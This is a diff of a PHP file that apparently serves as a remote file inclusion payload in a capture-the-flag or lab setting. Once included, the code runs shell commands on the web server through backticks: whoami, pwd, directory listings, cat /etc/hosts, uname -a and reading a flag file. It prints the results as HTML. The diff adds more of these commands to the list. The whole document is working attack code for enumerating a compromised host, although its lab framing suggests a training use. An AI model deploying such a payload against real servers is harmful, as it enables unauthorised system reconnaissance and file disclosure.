@@ -14,10 +14,12 @@
     $catflag1_output = `cat /var/www/html/rfi1/flag.php`;
     $uname_a = `uname -a`;
     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
-    ECHO "<div><ol><li>Root file directory listing (\"ls -alG /\")</li>";
-    ECHO "<li>Who Am I: (\"whoami\")</li>";
+    ECHO "<div><ol><li>Who Am I: (\"whoami\")</li>";
     ECHO "<li>Present Working Directory: (\"pwd\")</li>";
+    ECHO "<li>Root file directory listing (\"ls -alG /\")</li>";
+    ECHO "<li>RFI directory listing (\"ls /var/www/html/rfi1,ls /var/www/html/rfi2/\")</li>";
     ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
+    ECHO "<li>Print Out Flag: (\"cat flag.php\")</li>";
     ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
     ECHO "<dt><b>Who Am I?</b></dt>"; 
     ECHO "<dd>".$whoami_output. "</dd>";
